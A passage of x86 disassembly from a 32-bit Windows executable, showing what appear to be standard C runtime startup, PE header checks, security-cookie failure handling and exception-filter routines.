  406d3b:	cmp    eax,0x1
  406d3e:	jne    0x406d49
  406d40:	push   DWORD PTR [esi+0x10]
  406d43:	call   DWORD PTR ds:0x40910c
  406d49:	and    DWORD PTR [esi],0xfffffff9
  406d4c:	mov    DWORD PTR [esi+0x10],edi
  406d4f:	mov    DWORD PTR [esi+0xc],edi
  406d52:	mov    DWORD PTR [esi+0x8],edi
  406d55:	pop    edi
  406d56:	pop    esi
  406d57:	ret    
  406d58:	int3   
  406d59:	int3   
  406d5a:	int3   
  406d5b:	int3   
  406d5c:	int3   
  406d5d:	mov    edi,edi
  406d5f:	push   ebp
  406d60:	mov    ebp,esp
  406d62:	mov    edx,ecx
  406d64:	mov    eax,DWORD PTR [edx+0x4]
  406d67:	test   eax,eax
  406d69:	js     0x406dc7
  406d6b:	mov    ecx,DWORD PTR [ebp+0x8]
  406d6e:	push   esi
  406d6f:	test   ecx,ecx
  406d71:	js     0x406d83
  406d73:	cmp    ecx,DWORD PTR [edx+0xc]
  406d76:	jge    0x406db5
  406d78:	mov    eax,DWORD PTR [edx+0x10]
  406d7b:	xor    esi,esi
  406d7d:	mov    WORD PTR [eax+ecx*2],si
  406d81:	jmp    0x406dc1
  406d83:	mov    ecx,DWORD PTR [edx+0xc]
  406d86:	test   ecx,ecx
  406d88:	jle    0x406dbf
  406d8a:	mov    eax,DWORD PTR [edx+0x10]
  406d8d:	xor    esi,esi
  406d8f:	push   edi
  406d90:	xor    edi,edi
  406d92:	mov    WORD PTR [eax+ecx*2-0x2],si
  406d97:	mov    ecx,DWORD PTR [edx+0x10]
  406d9a:	lea    esi,[ecx+0x2]
  406d9d:	mov    ax,WORD PTR [ecx]
  406da0:	add    ecx,0x2
  406da3:	cmp    ax,di
  406da6:	jne    0x406d9d
  406da8:	sub    ecx,esi
  406daa:	sar    ecx,1
  406dac:	pop    edi
  406dad:	cmp    ecx,0x7fffffff
  406db3:	jbe    0x406dc1
  406db5:	mov    eax,0x8007006f
  406dba:	mov    DWORD PTR [edx+0x4],eax
  406dbd:	jmp    0x406dc6
  406dbf:	xor    ecx,ecx
  406dc1:	mov    DWORD PTR [edx+0x8],ecx
  406dc4:	xor    eax,eax
  406dc6:	pop    esi
  406dc7:	pop    ebp
  406dc8:	ret    0x4
  406dcb:	int3   
  406dcc:	int3   
  406dcd:	int3   
  406dce:	int3   
  406dcf:	int3   
  406dd0:	mov    edi,edi
  406dd2:	push   ebp
  406dd3:	mov    ebp,esp
  406dd5:	push   esi
  406dd6:	mov    esi,ecx
  406dd8:	mov    eax,DWORD PTR [esi+0x4]
  406ddb:	test   eax,eax
  406ddd:	js     0x406e32
  406ddf:	push   edi
  406de0:	mov    edi,DWORD PTR [ebp+0xc]
  406de3:	cmp    edi,0x4000000
  406de9:	ja     0x406e29
  406deb:	mov    eax,DWORD PTR [esi+0x8]
  406dee:	add    eax,edi
  406df0:	push   eax
  406df1:	call   0x406c69
  406df6:	test   eax,eax
  406df8:	jns    0x406dff
  406dfa:	mov    eax,DWORD PTR [esi+0x4]
  406dfd:	jmp    0x406e31
  406dff:	mov    ecx,DWORD PTR [esi+0x8]
  406e02:	lea    eax,[edi+edi*1]
  406e05:	push   eax
  406e06:	mov    eax,DWORD PTR [esi+0x10]
  406e09:	push   DWORD PTR [ebp+0x8]
  406e0c:	lea    eax,[eax+ecx*2]
  406e0f:	push   eax
  406e10:	call   0x407af0
  406e15:	mov    eax,DWORD PTR [esi+0x8]
  406e18:	add    esp,0xc
  406e1b:	add    eax,edi
  406e1d:	mov    ecx,esi
  406e1f:	push   eax
  406e20:	call   0x406d5d
  406e25:	xor    eax,eax
  406e27:	jmp    0x406e31
  406e29:	mov    eax,0x8007006f
  406e2e:	mov    DWORD PTR [esi+0x4],eax
  406e31:	pop    edi
  406e32:	pop    esi
  406e33:	pop    ebp
  406e34:	ret    0x8
  406e37:	int3   
  406e38:	int3   
  406e39:	int3   
  406e3a:	int3   
  406e3b:	int3   
  406e3c:	jmp    0x407206
  406e41:	int3   
  406e42:	int3   
  406e43:	int3   
  406e44:	int3   
  406e45:	int3   
  406e46:	jmp    0x406e3c
  406e4b:	int3   
  406e4c:	int3   
  406e4d:	int3   
  406e4e:	int3   
  406e4f:	int3   
  406e50:	mov    edi,edi
  406e52:	push   ebp
  406e53:	mov    ebp,esp
  406e55:	pop    ebp
  406e56:	jmp    0x406e60
  406e5b:	int3   
  406e5c:	int3   
  406e5d:	int3   
  406e5e:	int3   
  406e5f:	int3   
  406e60:	mov    edi,edi
  406e62:	push   ebp
  406e63:	mov    ebp,esp
  406e65:	push   esi
  406e66:	jmp    0x406e75
  406e68:	push   DWORD PTR [ebp+0x8]
  406e6b:	call   0x40753c
  406e70:	pop    ecx
  406e71:	test   eax,eax
  406e73:	je     0x406e84
  406e75:	push   DWORD PTR [ebp+0x8]
  406e78:	call   0x4072cc
  406e7d:	mov    esi,eax
  406e7f:	pop    ecx
  406e80:	test   esi,esi
  406e82:	je     0x406e68
  406e84:	mov    eax,esi
  406e86:	pop    esi
  406e87:	pop    ebp
  406e88:	ret    
  406e89:	int3   
  406e8a:	int3   
  406e8b:	int3   
  406e8c:	int3   
  406e8d:	int3   
  406e8e:	int3   
  406e8f:	int3   
  406e90:	mov    eax,0x5a4d
  406e95:	cmp    WORD PTR ds:0x400000,ax
  406e9c:	je     0x406ea2
  406e9e:	xor    eax,eax
  406ea0:	jmp    0x406ef0
  406ea2:	mov    ecx,DWORD PTR ds:0x40003c
  406ea8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406eb2:	jne    0x406e9e
  406eb4:	movzx  eax,WORD PTR [ecx+0x400018]
  406ebb:	cmp    eax,0x10b
  406ec0:	je     0x406edc
  406ec2:	cmp    eax,0x20b
  406ec7:	jne    0x406e9e
  406ec9:	xor    eax,eax
  406ecb:	cmp    DWORD PTR [ecx+0x400084],0xe
  406ed2:	jbe    0x406ef0
  406ed4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  406eda:	jmp    0x406eed
  406edc:	xor    eax,eax
  406ede:	cmp    DWORD PTR [ecx+0x400074],0xe
  406ee5:	jbe    0x406ef0
  406ee7:	cmp    DWORD PTR [ecx+0x4000e8],eax
  406eed:	setne  al
  406ef0:	push   0x2
  406ef2:	mov    ds:0x408098,eax
  406ef7:	call   0x40763e
  406efc:	push   eax
  406efd:	call   DWORD PTR ds:0x4091f0
  406f03:	or     DWORD PTR ds:0x4084c4,0xffffffff
  406f0a:	or     DWORD PTR ds:0x4084c8,0xffffffff
  406f11:	pop    ecx
  406f12:	pop    ecx
  406f13:	call   DWORD PTR ds:0x409200
  406f19:	mov    ecx,DWORD PTR ds:0x4083c8
  406f1f:	mov    DWORD PTR [eax],ecx
  406f21:	call   DWORD PTR ds:0x409218
  406f27:	mov    ecx,DWORD PTR ds:0x4083bc
  406f2d:	mov    DWORD PTR [eax],ecx
  406f2f:	call   0x407690
  406f34:	cmp    DWORD PTR ds:0x408004,0x0
  406f3b:	jne    0x406f49
  406f3d:	push   0x407690
  406f42:	call   DWORD PTR ds:0x4091d0
  406f48:	pop    ecx
  406f49:	call   0x40789f
  406f4e:	xor    eax,eax
  406f50:	ret    
  406f51:	int3   
  406f52:	int3   
  406f53:	int3   
  406f54:	int3   
  406f55:	int3   
  406f56:	int3   
  406f57:	int3   
  406f58:	int3   
  406f59:	int3   
  406f5a:	int3   
  406f5b:	int3   
  406f5c:	int3   
  406f5d:	int3   
  406f5e:	int3   
  406f5f:	int3   
  406f60:	mov    eax,ds:0x4083c4
  406f65:	push   0x40809c
  406f6a:	push   DWORD PTR ds:0x4083c0
  406f70:	mov    ds:0x40809c,eax
  406f75:	push   0x408090
  406f7a:	push   0x40808c
  406f7f:	push   0x408088
  406f84:	call   DWORD PTR ds:0x40920c
  406f8a:	add    esp,0x14
  406f8d:	mov    ds:0x408094,eax
  406f92:	ret    
  406f93:	int3   
  406f94:	int3   
  406f95:	int3   
  406f96:	int3   
  406f97:	int3   
  406f98:	int3   
  406f99:	int3   
  406f9a:	push   0x5c
  406f9c:	push   0x407ba0
  406fa1:	call   0x4078c4
  406fa6:	and    DWORD PTR [ebp-0x24],0x0
  406faa:	and    DWORD PTR [ebp-0x4],0x0
  406fae:	lea    eax,[ebp-0x6c]
  406fb1:	push   eax
  406fb2:	call   DWORD PTR ds:0x409194
  406fb8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406fbf:	xor    ebx,ebx
  406fc1:	inc    ebx
  406fc2:	mov    DWORD PTR [ebp-0x4],ebx
  406fc5:	mov    eax,fs:0x18
  406fcb:	mov    edi,DWORD PTR [eax+0x4]
  406fce:	xor    esi,esi
  406fd0:	mov    edx,0x4084bc
  406fd5:	mov    ecx,edi
  406fd7:	xor    eax,eax
  406fd9:	lock cmpxchg DWORD PTR [edx],ecx
  406fdd:	test   eax,eax
  406fdf:	je     0x406fe7
  406fe1:	cmp    eax,edi
  406fe3:	jne    0x406ff9
  406fe5:	mov    esi,ebx
  406fe7:	cmp    DWORD PTR ds:0x4084c0,ebx
  406fed:	jne    0x407006
  406fef:	push   0x1f
  406ff1:	call   0x40767a
  406ff6:	pop    ecx
  406ff7:	jmp    0x407035
  406ff9:	push   0x3e8
  406ffe:	call   DWORD PTR ds:0x4091a4
  407004:	jmp    0x406fd0
  407006:	cmp    DWORD PTR ds:0x4084c0,0x0
  40700d:	jne    0x40702f
  40700f:	mov    DWORD PTR ds:0x4084c0,ebx
  407015:	push   0x40102c
  40701a:	push   0x401020
  40701f:	call   0x407186
  407024:	pop    ecx
  407025:	pop    ecx
  407026:	test   eax,eax
  407028:	je     0x407035
  40702a:	jmp    0x40716f
  40702f:	mov    DWORD PTR ds:0x408084,ebx
  407035:	cmp    DWORD PTR ds:0x4084c0,ebx
  40703b:	jne    0x407058
  40703d:	push   0x40101c
  407042:	push   0x401000
  407047:	call   0x4078b8
  40704c:	pop    ecx
  40704d:	pop    ecx
  40704e:	mov    DWORD PTR ds:0x4084c0,0x2
  407058:	test   esi,esi
  40705a:	jne    0x407065
  40705c:	xor    eax,eax
  40705e:	mov    ecx,0x4084bc
  407063:	xchg   DWORD PTR [ecx],eax
  407065:	cmp    DWORD PTR ds:0x4084cc,0x0
  40706c:	je     0x407093
  40706e:	push   0x4084cc
  407073:	call   0x4076f0
  407078:	pop    ecx
  407079:	test   eax,eax
  40707b:	je     0x407093
  40707d:	push   0x0
  40707f:	push   0x2
  407081:	push   0x0
  407083:	mov    esi,DWORD PTR ds:0x4084cc
  407089:	mov    ecx,esi
  40708b:	call   DWORD PTR ds:0x409254
  407091:	call   esi
  407093:	mov    eax,ds:0x4091fc
  407098:	mov    ecx,DWORD PTR [eax]
  40709a:	test   ecx,ecx
  40709c:	je     0x40716f
  4070a2:	mov    DWORD PTR [ebp-0x20],ecx
  4070a5:	push   0x20
  4070a7:	pop    esi
  4070a8:	mov    edx,DWORD PTR [ebp-0x24]
  4070ab:	movzx  eax,WORD PTR [ecx]
  4070ae:	cmp    ax,si
  4070b1:	ja     0x407103
  4070b3:	test   ax,ax
  4070b6:	je     0x4070bc
  4070b8:	test   edx,edx
  4070ba:	jne    0x407103
  4070bc:	movzx  eax,WORD PTR [ecx]
  4070bf:	test   ax,ax
  4070c2:	je     0x4070d1
  4070c4:	cmp    ax,si
  4070c7:	ja     0x4070d1
  4070c9:	add    ecx,0x2
  4070cc:	mov    DWORD PTR [ebp-0x20],ecx
  4070cf:	jmp    0x4070bc
  4070d1:	test   BYTE PTR [ebp-0x40],0x1
  4070d5:	je     0x4070dd
  4070d7:	movzx  eax,WORD PTR [ebp-0x3c]
  4070db:	jmp    0x4070e0
  4070dd:	push   0xa
  4070df:	pop    eax
  4070e0:	push   eax
  4070e1:	push   ecx
  4070e2:	push   0x0
  4070e4:	push   0x400000
  4070e9:	call   0x401dfc
  4070ee:	mov    ds:0x408080,eax
  4070f3:	cmp    DWORD PTR ds:0x408098,0x0
  4070fa:	jne    0x40714b
  4070fc:	push   eax
  4070fd:	call   DWORD PTR ds:0x4091ec
  407103:	cmp    eax,0x22
  407106:	jne    0x407114
  407108:	xor    eax,eax
  40710a:	test   edx,edx
  40710c:	sete   al
  40710f:	mov    edx,eax
  407111:	mov    DWORD PTR [ebp-0x24],edx
  407114:	add    ecx,0x2
  407117:	mov    DWORD PTR [ebp-0x20],ecx
  40711a:	jmp    0x4070ab
  40711c:	mov    ecx,DWORD PTR [ebp-0x14]
  40711f:	mov    eax,DWORD PTR [ecx]
  407121:	mov    eax,DWORD PTR [eax]
  407123:	mov    DWORD PTR [ebp-0x28],eax
  407126:	push   ecx
  407127:	push   eax
  407128:	call   0x4075c4
  40712d:	pop    ecx
  40712e:	pop    ecx
  40712f:	ret    
  407130:	mov    esp,DWORD PTR [ebp-0x18]
  407133:	mov    eax,DWORD PTR [ebp-0x28]
  407136:	mov    ds:0x408080,eax
  40713b:	cmp    DWORD PTR ds:0x408098,0x0
  407142:	jne    0x40714b
  407144:	push   eax
  407145:	call   DWORD PTR ds:0x4091e0
  40714b:	cmp    DWORD PTR ds:0x408084,0x0
  407152:	jne    0x40715f
  407154:	call   DWORD PTR ds:0x4091d8
  40715a:	mov    eax,ds:0x408080
  40715f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407166:	jmp    0x40717b
  407168:	xor    eax,eax
  40716a:	inc    eax
  40716b:	ret    
  40716c:	mov    esp,DWORD PTR [ebp-0x18]
  40716f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407176:	mov    eax,0xff
  40717b:	call   0x40790c
  407180:	ret    
  407181:	int3   
  407182:	int3   
  407183:	int3   
  407184:	int3   
  407185:	int3   
  407186:	mov    edi,edi
  407188:	push   ebp
  407189:	mov    ebp,esp
  40718b:	push   ecx
  40718c:	mov    eax,ds:0x408008
  407191:	xor    eax,ebp
  407193:	mov    DWORD PTR [ebp-0x4],eax
  407196:	push   esi
  407197:	mov    esi,DWORD PTR [ebp+0x8]
  40719a:	xor    eax,eax
  40719c:	cmp    esi,DWORD PTR [ebp+0xc]
  40719f:	jae    0x4071bf
  4071a1:	push   edi
  4071a2:	test   eax,eax
  4071a4:	jne    0x4071be
  4071a6:	mov    edi,DWORD PTR [esi]
  4071a8:	test   edi,edi
  4071aa:	je     0x4071b6
  4071ac:	mov    ecx,edi
  4071ae:	call   DWORD PTR ds:0x409254
  4071b4:	call   edi
  4071b6:	add    esi,0x4
  4071b9:	cmp    esi,DWORD PTR [ebp+0xc]
  4071bc:	jb     0x4071a2
  4071be:	pop    edi
  4071bf:	mov    ecx,DWORD PTR [ebp-0x4]
  4071c2:	xor    ecx,ebp
  4071c4:	pop    esi
  4071c5:	call   0x4071f0
  4071ca:	mov    esp,ebp
  4071cc:	pop    ebp
  4071cd:	ret    
  4071ce:	int3   
  4071cf:	int3   
  4071d0:	int3   
  4071d1:	int3   
  4071d2:	int3   
  4071d3:	int3   
  4071d4:	int3   
  4071d5:	int3   
  4071d6:	int3   
  4071d7:	int3   
  4071d8:	int3   
  4071d9:	int3   
  4071da:	int3   
  4071db:	int3   
  4071dc:	int3   
  4071dd:	int3   
  4071de:	int3   
  4071df:	int3   
  4071e0:	call   0x4077f8
  4071e5:	jmp    0x406f9a
  4071ea:	int3   
  4071eb:	int3   
  4071ec:	int3   
  4071ed:	int3   
  4071ee:	int3   
  4071ef:	int3   
  4071f0:	cmp    ecx,DWORD PTR ds:0x408008
  4071f6:	jne    0x4071fb
  4071f8:	ret    0x0
  4071fb:	jmp    0x40735b
  407200:	int3   
  407201:	int3   
  407202:	int3   
  407203:	int3   
  407204:	int3   
  407205:	int3   
  407206:	jmp    DWORD PTR ds:0x40923c
  40720c:	int3   
  40720d:	int3   
  40720e:	int3   
  40720f:	int3   
  407210:	int3   
  407211:	push   0x18
  407213:	push   0x407bc8
  407218:	call   0x4078c4
  40721d:	and    DWORD PTR [ebp-0x28],0x0
  407221:	mov    eax,ds:0x4084c8
  407226:	mov    DWORD PTR [ebp-0x20],eax
  407229:	cmp    eax,0xffffffff
  40722c:	jne    0x407244
  40722e:	push   DWORD PTR [ebp+0x8]
  407231:	mov    esi,DWORD PTR ds:0x409240
  407237:	mov    ecx,esi
  407239:	call   DWORD PTR ds:0x409254
  40723f:	call   esi
  407241:	pop    ecx
  407242:	jmp    0x407298
  407244:	push   0x8
  407246:	call   0x407956
  40724b:	pop    ecx
  40724c:	and    DWORD PTR [ebp-0x4],0x0
  407250:	mov    eax,ds:0x4084c8
  407255:	mov    DWORD PTR [ebp-0x20],eax
  407258:	mov    eax,ds:0x4084c4
  40725d:	mov    DWORD PTR [ebp-0x24],eax
  407260:	lea    eax,[ebp-0x24]
  407263:	push   eax
  407264:	lea    eax,[ebp-0x20]
  407267:	push   eax
  407268:	push   DWORD PTR [ebp+0x8]
  40726b:	call   0x40796e
  407270:	add    esp,0xc
  407273:	mov    esi,eax
  407275:	mov    DWORD PTR [ebp-0x28],esi
  407278:	mov    ecx,DWORD PTR [ebp-0x20]
  40727b:	mov    DWORD PTR ds:0x4084c8,ecx
  407281:	mov    ecx,DWORD PTR [ebp-0x24]
  407284:	mov    DWORD PTR ds:0x4084c4,ecx
  40728a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407291:	call   0x4072a1
  407296:	mov    eax,esi
  407298:	call   0x40790c
  40729d:	ret    
  40729e:	mov    esi,DWORD PTR [ebp-0x28]
  4072a1:	push   0x8
  4072a3:	call   0x407962
  4072a8:	pop    ecx
  4072a9:	ret    
  4072aa:	int3   
  4072ab:	int3   
  4072ac:	int3   
  4072ad:	int3   
  4072ae:	int3   
  4072af:	mov    edi,edi
  4072b1:	push   ebp
  4072b2:	mov    ebp,esp
  4072b4:	push   DWORD PTR [ebp+0x8]
  4072b7:	call   0x407211
  4072bc:	neg    eax
  4072be:	pop    ecx
  4072bf:	sbb    eax,eax
  4072c1:	neg    eax
  4072c3:	dec    eax
  4072c4:	pop    ebp
  4072c5:	ret    
  4072c6:	int3   
  4072c7:	int3   
  4072c8:	int3   
  4072c9:	int3   
  4072ca:	int3   
  4072cb:	int3   
  4072cc:	jmp    DWORD PTR ds:0x409234
  4072d2:	int3   
  4072d3:	int3   
  4072d4:	int3   
  4072d5:	int3   
  4072d6:	int3   
  4072d7:	int3   
  4072d8:	int3   
  4072d9:	int3   
  4072da:	int3   
  4072db:	int3   
  4072dc:	int3   
  4072dd:	int3   
  4072de:	int3   
  4072df:	int3   
  4072e0:	mov    edi,edi
  4072e2:	push   ebp
  4072e3:	mov    ebp,esp
  4072e5:	mov    ecx,DWORD PTR [ebp+0xc]
  4072e8:	test   ecx,ecx
  4072ea:	je     0x407316
  4072ec:	push   0xffffffe0
  4072ee:	xor    edx,edx
  4072f0:	pop    eax
  4072f1:	div    ecx
  4072f3:	cmp    eax,DWORD PTR [ebp+0x10]
  4072f6:	jae    0x407316
  4072f8:	call   0x40797a
  4072fd:	mov    DWORD PTR [eax],0xc
  407303:	xor    eax,eax
  407305:	push   eax
  407306:	push   eax
  407307:	push   eax
  407308:	push   eax
  407309:	push   eax
  40730a:	call   0x407985
  40730f:	add    esp,0x14
  407312:	xor    eax,eax
  407314:	pop    ebp
  407315:	ret    
  407316:	imul   ecx,DWORD PTR [ebp+0x10]
  40731a:	push   ecx
  40731b:	push   DWORD PTR [ebp+0x8]
  40731e:	call   0x407a3c
  407323:	pop    ecx
  407324:	pop    ecx
  407325:	pop    ebp
  407326:	ret    
  407327:	int3   
  407328:	int3   
  407329:	int3   
  40732a:	int3   
  40732b:	int3   
  40732c:	mov    edi,edi
  40732e:	push   ebp
  40732f:	mov    ebp,esp
  407331:	push   0x0
  407333:	call   DWORD PTR ds:0x40912c
  407339:	push   DWORD PTR [ebp+0x8]
  40733c:	call   DWORD PTR ds:0x409128
  407342:	push   0xc0000409
  407347:	call   DWORD PTR ds:0x40917c
  40734d:	push   eax
  40734e:	call   DWORD PTR ds:0x409190
  407354:	pop    ebp
  407355:	ret    
  407356:	int3   
  407357:	int3   
  407358:	int3   
  407359:	int3   
  40735a:	int3   
  40735b:	mov    edi,edi
  40735d:	push   ebp
  40735e:	mov    ebp,esp
  407360:	sub    esp,0x324
  407366:	mov    ds:0x4081a0,eax
  40736b:	mov    DWORD PTR ds:0x40819c,ecx
  407371:	mov    DWORD PTR ds:0x408198,edx
  407377:	mov    DWORD PTR ds:0x408194,ebx
  40737d:	mov    DWORD PTR ds:0x408190,esi
  407383:	mov    DWORD PTR ds:0x40818c,edi
  407389:	data16 mov WORD PTR ds:0x4081b8,ss
  407390:	data16 mov WORD PTR ds:0x4081ac,cs
  407397:	data16 mov WORD PTR ds:0x408188,ds
  40739e:	data16 mov WORD PTR ds:0x408184,es
  4073a5:	data16 mov WORD PTR ds:0x408180,fs
  4073ac:	data16 mov WORD PTR ds:0x40817c,gs
  4073b3:	pushf  
  4073b4:	pop    DWORD PTR ds:0x4081b0
  4073ba:	mov    eax,DWORD PTR [ebp+0x0]
  4073bd:	mov    ds:0x4081a4,eax
  4073c2:	mov    eax,DWORD PTR [ebp+0x4]
  4073c5:	mov    ds:0x4081a8,eax
  4073ca:	lea    eax,[ebp+0x8]
  4073cd:	mov    ds:0x4081b4,eax
  4073d2:	mov    eax,DWORD PTR [ebp-0x324]
  4073d8:	mov    DWORD PTR ds:0x4080f0,0x10001
  4073e2:	mov    eax,ds:0x4081a8
  4073e7:	mov    ds:0x4080ac,eax
  4073ec:	mov    DWORD PTR ds:0x4080a0,0xc0000409
  4073f6:	mov    DWORD PTR ds:0x4080a4,0x1
  407400:	mov    DWORD PTR ds:0x4080b0,0x3
  40740a:	push   0x4
  40740c:	pop    eax
  40740d:	imul   eax,eax,0x0
  407410:	mov    DWORD PTR [eax+0x4080b4],0x2
  40741a:	push   0x4
  40741c:	pop    eax
  40741d:	shl    eax,0x0
  407420:	mov    ecx,DWORD PTR ds:0x408008
  407426:	mov    DWORD PTR [eax+0x4080b4],ecx
  40742c:	push   0x4
  40742e:	pop    eax
  40742f:	shl    eax,1
  407431:	mov    ecx,DWORD PTR ds:0x40800c
  407437:	mov    DWORD PTR [eax+0x4080b4],ecx
  40743d:	push   0x4
  40743f:	pop    eax
  407440:	imul   eax,eax,0x0
  407443:	mov    ecx,DWORD PTR ds:0x408008
  407449:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40744d:	push   0x4
  40744f:	pop    eax
  407450:	shl    eax,0x0
  407453:	mov    ecx,DWORD PTR ds:0x40800c
  407459:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40745d:	push   0x401170
  407462:	call   0x40732c
  407467:	mov    esp,ebp
  407469:	pop    ebp
  40746a:	ret    
  40746b:	int3   
  40746c:	int3   
  40746d:	int3   
  40746e:	int3   
  40746f:	int3   
  407470:	mov    edi,edi
  407472:	push   ebp
  407473:	mov    ebp,esp
  407475:	mov    ds:0x4081a0,eax
  40747a:	mov    DWORD PTR ds:0x40819c,ecx
  407480:	mov    DWORD PTR ds:0x408198,edx
  407486:	mov    DWORD PTR ds:0x408194,ebx
  40748c:	mov    DWORD PTR ds:0x408190,esi
  407492:	mov    DWORD PTR ds:0x40818c,edi
  407498:	data16 mov WORD PTR ds:0x4081b8,ss
  40749f:	data16 mov WORD PTR ds:0x4081ac,cs
  4074a6:	data16 mov WORD PTR ds:0x408188,ds
  4074ad:	data16 mov WORD PTR ds:0x408184,es
  4074b4:	data16 mov WORD PTR ds:0x408180,fs
  4074bb:	data16 mov WORD PTR ds:0x40817c,gs
  4074c2:	pushf  
  4074c3:	pop    DWORD PTR ds:0x4081b0
  4074c9:	mov    DWORD PTR ds:0x4080f0,0x10001
  4074d3:	mov    eax,DWORD PTR [ebp+0x4]
  4074d6:	mov    ds:0x4081a8,eax
  4074db:	lea    eax,[ebp+0x4]
  4074de:	add    eax,0x4
  4074e1:	mov    ds:0x4081b4,eax
  4074e6:	mov    eax,ds:0x4081a8
  4074eb:	mov    ds:0x4080ac,eax
  4074f0:	mov    DWORD PTR ds:0x4080a0,0xc0000409
  4074fa:	mov    DWORD PTR ds:0x4080a4,0x1
  407504:	mov    DWORD PTR ds:0x4080b0,0x1
  40750e:	push   0x4
  407510:	pop    eax
  407511:	imul   eax,eax,0x0
  407514:	mov    DWORD PTR [eax+0x4080b4],0x8
  40751e:	push   0x401170
  407523:	call   0x40732c
  407528:	pop    ebp
  407529:	ret    
  40752a:	int3   
  40752b:	int3   
  40752c:	int3   
  40752d:	int3   
  40752e:	int3   
  40752f:	int3   
  407530:	jmp    DWORD PTR ds:0x40921c
  407536:	int3   
  407537:	int3   
  407538:	int3   
  407539:	int3   
  40753a:	int3   
  40753b:	int3   
  40753c:	jmp    DWORD PTR ds:0x4091e8
  407542:	int3   
  407543:	int3   
  407544:	int3   
  407545:	int3   
  407546:	int3   
  407547:	int3   
  407548:	jmp    DWORD PTR ds:0x4091dc
  40754e:	int3   
  40754f:	int3   
  407550:	int3   
  407551:	int3   
  407552:	int3   
  407553:	int3   
  407554:	int3   
  407555:	int3   
  407556:	int3   
  407557:	int3   
  407558:	int3   
  407559:	int3   
  40755a:	int3   
  40755b:	int3   
  40755c:	int3   
  40755d:	int3   
  40755e:	int3   
  40755f:	int3   
  407560:	mov    edi,edi
  407562:	push   ebp
  407563:	mov    ebp,esp
  407565:	mov    eax,DWORD PTR [ebp+0x8]
  407568:	mov    eax,DWORD PTR [eax]
  40756a:	cmp    DWORD PTR [eax],0xe06d7363
  407570:	jne    0x40759d
  407572:	cmp    DWORD PTR [eax+0x10],0x3
  407576:	jne    0x40759d
  407578:	mov    eax,DWORD PTR [eax+0x14]
  40757b:	cmp    eax,0x19930520
  407580:	je     0x407597
  407582:	cmp    eax,0x19930521
  407587:	je     0x407597
  407589:	cmp    eax,0x19930522
  40758e:	je     0x407597
  407590:	cmp    eax,0x1994000
  407595:	jne    0x40759d
  407597:	call   DWORD PTR ds:0x4091f8
  40759d:	xor    eax,eax
  40759f:	pop    ebp
  4075a0:	ret    0x4
  4075a3:	int3   
  4075a4:	int3   
  4075a5:	int3   
  4075a6:	int3   
  4075a7:	int3   
  4075a8:	int3   
  4075a9:	int3   
  4075aa:	int3   
  4075ab:	int3   
  4075ac:	int3   
  4075ad:	int3   
  4075ae:	int3   
  4075af:	int3   
  4075b0:	push   0x407560
  4075b5:	call   DWORD PTR ds:0x40912c
  4075bb:	xor    eax,eax
  4075bd:	ret    
  4075be:	int3   
  4075bf:	int3   
  4075c0:	int3   
  4075c1:	int3   
  4075c2:	int3   
  4075c3:	int3   
  4075c4:	jmp    DWORD PTR ds:0x409210
  4075ca:	int3   
  4075cb:	int3   
  4075cc:	int3   
  4075cd:	int3   
  4075ce:	int3   
  4075cf:	push   0xc
  4075d1:	push   0x407be8
  4075d6:	call   0x407a48
  4075db:	xor    ecx,ecx
  4075dd:	mov    eax,DWORD PTR [ebp+0x8]
  4075e0:	test   eax,eax
  4075e2:	je     0x40762f
  4075e4:	cmp    eax,0xffffffff
  4075e7:	je     0x40762f
  4075e9:	mov    DWORD PTR [ebp-0x4],ecx
  4075ec:	mov    edx,0x5a4d
  4075f1:	cmp    WORD PTR [eax],dx
  4075f4:	jne    0x407628
  4075f6:	mov    edx,DWORD PTR [eax+0x3c]
  4075f9:	test   edx,edx
  4075fb:	js     0x407628
  4075fd:	cmp    edx,0x10000000
  407603:	jae    0x407628
  407605:	add    eax,edx
  407607:	mov    DWORD PTR [ebp-0x1c],eax
  40760a:	mov    ecx,DWORD PTR [eax]
  40760c:	sub    ecx,0x4550
  407612:	neg    ecx
  407614:	sbb    ecx,ecx
  407616:	not    ecx
  407618:	and    ecx,eax
  40761a:	jmp    0x407625
  40761c:	xor    eax,eax
  40761e:	inc    eax
  40761f:	ret    
  407620:	mov    esp,DWORD PTR [ebp-0x18]
  407623:	xor    ecx,ecx
  407625:	mov    DWORD PTR [ebp-0x1c],ecx
  407628:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40762f:	mov    eax,ecx
  407631:	call   0x407a8d
  407636:	ret    0x4
  407639:	int3   
  40763a:	int3   
  40763b:	int3   
  40763c:	int3   
  40763d:	int3   
  40763e:	mov    edi,edi
  407640:	push   ebp
  407641:	mov    ebp,esp
  407643:	push   0x0
  407645:	call   DWORD PTR ds:0x409164
  40764b:	test   eax,eax
  40764d:	je     0x40766f
  40764f:	push   eax
  407650:	call   0x4075cf
  407655:	test   eax,eax
  407657:	je     0x40766f
  407659:	movzx  ecx,WORD PTR [eax+0x5c]
  40765d:	push   0x2
  40765f:	pop    eax
  407660:	cmp    cx,ax
  407663:	je     0x407672
  407665:	cmp    ecx,0x3
  407668:	jne    0x40766f
  40766a:	xor    eax,eax
  40766c:	inc    eax
  40766d:	pop    ebp
  40766e:	ret    
  40766f:	mov    eax,DWORD PTR [ebp+0x8]
  407672:	pop    ebp
  407673:	ret    
  407674:	int3   
  407675:	int3   
  407676:	int3   
  407677:	int3   
  407678:	int3   
  407679:	int3   
  40767a:	jmp    DWORD PTR ds:0x409214
  407680:	int3   
  407681:	int3   
  407682:	int3   
  407683:	int3   
  407684:	int3   
  407685:	int3   
  407686:	int3   
  407687:	int3   
  407688:	int3   
  407689:	int3   
  40768a:	int3   
  40768b:	int3   
  40768c:	int3   
  40768d:	int3   
  40768e:	int3   
  40768f:	int3   
  407690:	xor    eax,eax
  407692:	ret    
  407693:	int3   
  407694:	int3   
  407695:	int3   
  407696:	int3   
  407697:	int3   
  407698:	int3   
  407699:	int3   
  40769a:	int3   
  40769b:	int3   
  40769c:	int3   
  40769d:	int3   
  40769e:	int3   
  40769f:	int3   
  4076a0:	mov    edi,edi
  4076a2:	push   ebp
  4076a3:	mov    ebp,esp
  4076a5:	mov    eax,DWORD PTR [ebp+0x8]
  4076a8:	xor    edx,edx
